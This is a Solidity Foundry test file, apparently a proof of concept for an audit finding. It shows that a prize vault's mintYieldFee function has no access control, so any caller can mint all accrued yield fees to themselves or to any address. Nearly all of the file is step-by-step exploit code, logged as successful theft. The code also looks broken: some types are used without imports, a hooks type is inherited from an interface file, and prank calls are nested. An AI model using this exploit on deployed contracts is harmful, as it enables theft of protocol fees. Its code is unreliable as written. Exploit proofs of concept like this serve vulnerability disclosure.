// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {Test, console} from "forge-std/Test.sol";
import {Vault} from "../../src/Vault.sol";
import {ERC20} from "openzeppelin/token/ERC20/ERC20.sol";
import {ERC4626} from "openzeppelin/token/ERC20/extensions/ERC4626.sol";
import {TwabController} from "v5-twab-controller/TwabController.sol";
import {PrizePool} from "v5-prize-pool/PrizePool.sol";
import {LiquidationPair} from "v5-liquidator/LiquidationPair.sol";
import {VaultHooks} from "../../src/interfaces/IVaultHooks.sol";

// Mock contracts for testing
contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MockYieldVault is ERC4626 {
    constructor(ERC20 asset) ERC4626(asset) {}
    
    function deposit(uint256 assets, address receiver) public override returns (uint256 shares) {
        shares = assets; // 1:1 ratio for simplicity
        _mint(receiver, shares);
        
        IERC20(asset()).transferFrom(msg.sender, address(this), assets);
    }
    
    function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256 shares) {
        shares = assets; // 1:1 ratio for simplicity
        _burn(owner, shares);
        
        IERC20(asset()).transfer(receiver, assets);
    }
    
    function maxWithdraw(address owner) public view override returns (uint256) {
        return balanceOf(owner);
    }
}

contract MockTwabController {
    mapping(address => mapping(address => uint96)) public balances;
    mapping(address => uint96) public totalSupplies;
    address public constant SPONSORSHIP_ADDRESS = address(1);
    
    function balanceOf(address vault, address account) external view returns (uint256) {
        return balances[vault][account];
    }
    
    function totalSupply(address vault) external view returns (uint256) {
        return totalSupplies[vault];
    }
    
    function mint(address to, uint96 amount) external {
        balances[msg.sender][to] += amount;
        totalSupplies[msg.sender] += amount;
    }
    
    function burn(address from, uint96 amount) external {
        balances[msg.sender][from] -= amount;
        totalSupplies[msg.sender] -= amount;
    }
    
    function transfer(address from, address to, uint96 amount) external {
        balances[msg.sender][from] -= amount;
        balances[msg.sender][to] += amount;
    }
    
    function delegateOf(address vault, address user) external view returns (address) {
        return user;
    }
    
    function sponsor(address user) external {
        // Mock implementation
    }
}

contract MockPrizePool {
    ERC20 public prizeToken;
    
    constructor(ERC20 _prizeToken) {
        prizeToken = _prizeToken;
    }
    
    function contributePrizeTokens(address from, uint256 amount) external {
        prizeToken.transferFrom(from, address(this), amount);
    }
    
    function claimPrize(
        address winner,
        uint8 tier,
        uint32 prizeIndex,
        address recipient,
        uint96 fee,
        address feeRecipient
    ) external returns (uint256) {
        return 0; // Mock implementation
    }
}

contract MockLiquidationPair {
    ERC20 public tokenIn;
    
    constructor(ERC20 _tokenIn) {
        tokenIn = _tokenIn;
    }
}

contract MockVaultHooks is VaultHooks {
    function beforeClaimPrize(
        address winner,
        uint8 tier,
        uint32 prizeIndex
    ) external pure returns (address) {
        return winner;
    }
    
    function afterClaimPrize(
        address winner,
        uint8 tier,
        uint32 prizeIndex,
        uint256 prizeAmount,
        address recipient
    ) external pure {}
}

contract ExploitTest is Test {
    Vault public vault;
    MockERC20 public asset;
    MockERC20 public prizeToken;
    MockYieldVault public yieldVault;
    MockTwabController public twabController;
    MockPrizePool public prizePool;
    MockLiquidationPair public liquidationPair;
    
    address public owner = address(0x1);
    address public yieldFeeRecipient = address(0x2);
    address public attacker = address(0x3);
    address public randomUser = address(0x4);
    
    function setUp() public {
        // Deploy mock contracts
        asset = new MockERC20("Asset", "ASSET");
        prizeToken = new MockERC20("Prize", "PRIZE");
        yieldVault = new MockYieldVault(asset);
        twabController = new MockTwabController();
        prizePool = new MockPrizePool(prizeToken);
        liquidationPair = new MockLiquidationPair(prizeToken);
        
        // Mint initial tokens
        asset.mint(owner, 1000 ether);
        asset.mint(attacker, 100 ether);
        prizeToken.mint(address(liquidationPair), 100 ether);
        
        // Deploy Vault
        vm.startPrank(owner);
        vault = new Vault(
            IERC20(address(asset)),
            "Vault Shares",
            "VS",
            twabController,
            IERC4626(address(yieldVault)),
            prizePool,
            address(0), // claimer
            yieldFeeRecipient,
            1e8, // 10% yield fee
            owner
        );
        
        // Set liquidation pair
        vault.setLiquidationPair(liquidationPair);
        vm.stopPrank();
        
        // Approve tokens
        vm.startPrank(owner);
        asset.approve(address(vault), type(uint256).max);
        vm.stopPrank();
        
        vm.startPrank(attacker);
        asset.approve(address(vault), type(uint256).max);
        vm.stopPrank();
    }
    
    function test_mintYieldFeeVulnerability() public {
        // Step 1: Owner deposits assets to generate yield
        vm.startPrank(owner);
        uint256 depositAmount = 100 ether;
        vault.deposit(depositAmount, owner);
        vm.stopPrank();
        
        // Step 2: Simulate yield generation by directly increasing yield fee balance
        // In a real scenario, this would happen through liquidation
        vm.startPrank(owner);
        
        // We need to simulate yield fee accumulation
        // Since we can't directly modify _yieldFeeTotalSupply, we'll use liquidation
        // First, let's make the liquidation pair have prize tokens
        prizeToken.mint(address(liquidationPair), 10 ether);
        
        // Perform liquidation to generate yield fees
        vm.startPrank(address(liquidationPair));
        vault.liquidate(
            address(this),
            address(prizeToken),
            1 ether,
            address(vault),
            0.9 ether
        );
        vm.stopPrank();
        
        vm.stopPrank();
        
        // Step 3: Check that yield fees have been accumulated
        uint256 yieldFeeBalance = vault.yieldFeeTotalSupply();
        console.log("Yield fee total supply:", yieldFeeBalance);
        assertTrue(yieldFeeBalance > 0, "Yield fees should be accumulated");
        
        // Step 4: Attacker exploits the vulnerability by calling mintYieldFee
        // The attacker can mint yield fees to themselves even though they're not the yield fee recipient
        vm.startPrank(attacker);
        
        uint256 attackerBalanceBefore = vault.balanceOf(attacker);
        uint256 yieldFeeRecipientBalanceBefore = vault.balanceOf(yieldFeeRecipient);
        
        // Attacker mints all available yield fees to themselves
        vault.mintYieldFee(yieldFeeBalance, attacker);
        
        uint256 attackerBalanceAfter = vault.balanceOf(attacker);
        uint256 yieldFeeRecipientBalanceAfter = vault.balanceOf(yieldFeeRecipient);
        
        vm.stopPrank();
        
        // Step 5: Verify the exploit succeeded
        assertEq(
            attackerBalanceAfter,
            attackerBalanceBefore + yieldFeeBalance,
            "Attacker should have received the yield fees"
        );
        
        assertEq(
            yieldFeeRecipientBalanceAfter,
            yieldFeeRecipientBalanceBefore,
            "Yield fee recipient should not have received anything"
        );
        
        assertEq(
            vault.yieldFeeTotalSupply(),
            0,
            "All yield fees should have been claimed"
        );
        
        console.log("Attacker successfully stole", yieldFeeBalance, "yield fees!");
    }
    
    function test_mintYieldFeeToAnyAddress() public {
        // Step 1: Generate yield fees
        vm.startPrank(owner);
        uint256 depositAmount = 100 ether;
        vault.deposit(depositAmount, owner);
        
        // Simulate yield generation
        prizeToken.mint(address(liquidationPair), 10 ether);
        
        vm.startPrank(address(liquidationPair));
        vault.liquidate(
            address(this),
            address(prizeToken),
            1 ether,
            address(vault),
            0.9 ether
        );
        vm.stopPrank();
        vm.stopPrank();
        
        uint256 yieldFeeBalance = vault.yieldFeeTotalSupply();
        assertTrue(yieldFeeBalance > 0, "Yield fees should be accumulated");
        
        // Step 2: Attacker can mint yield fees to ANY address, not just themselves
        vm.startPrank(attacker);
        
        address randomRecipient = address(0x99999);
        uint256 randomRecipientBalanceBefore = vault.balanceOf(randomRecipient);
        
        // Attacker mints yield fees to a random address
        vault.mintYieldFee(yieldFeeBalance, randomRecipient);
        
        uint256 randomRecipientBalanceAfter = vault.balanceOf(randomRecipient);
        
        vm.stopPrank();
        
        // Step 3: Verify the exploit
        assertEq(
            randomRecipientBalanceAfter,
            randomRecipientBalanceBefore + yieldFeeBalance,
            "Random recipient should have received the yield fees"
        );
        
        console.log("Attacker successfully minted yield fees to arbitrary address!");
    }
    
    function test_noAccessControlOnMintYieldFee() public {
        // Step 1: Generate yield fees
        vm.startPrank(owner);
        uint256 depositAmount = 100 ether;
        vault.deposit(depositAmount, owner);
        
        prizeToken.mint(address(liquidationPair), 10 ether);
        
        vm.startPrank(address(liquidationPair));
        vault.liquidate(
            address(this),
            address(prizeToken),
            1 ether,
            address(vault),
            0.9 ether
        );
        vm.stopPrank();
        vm.stopPrank();
        
        uint256 yieldFeeBalance = vault.yieldFeeTotalSupply();
        assertTrue(yieldFeeBalance > 0, "Yield fees should be accumulated");
        
        // Step 2: Multiple attackers can call mintYieldFee
        // First attacker takes half
        vm.startPrank(attacker);
        uint256 halfYield = yieldFeeBalance / 2;
        vault.mintYieldFee(halfYield, attacker);
        vm.stopPrank();
        
        // Second attacker takes the rest
        vm.startPrank(randomUser);
        uint256 remainingYield = vault.yieldFeeTotalSupply();
        vault.mintYieldFee(remainingYield, randomUser);
        vm.stopPrank();
        
        // Step 3: Verify both attackers succeeded
        assertEq(vault.yieldFeeTotalSupply(), 0, "All yield fees should be claimed");
        assertTrue(vault.balanceOf(attacker) >= halfYield, "Attacker should have received yield fees");
        assertTrue(vault.balanceOf(randomUser) >= remainingYield, "Random user should have received yield fees");
        
        console.log("Multiple attackers successfully split the yield fees!");
    }
}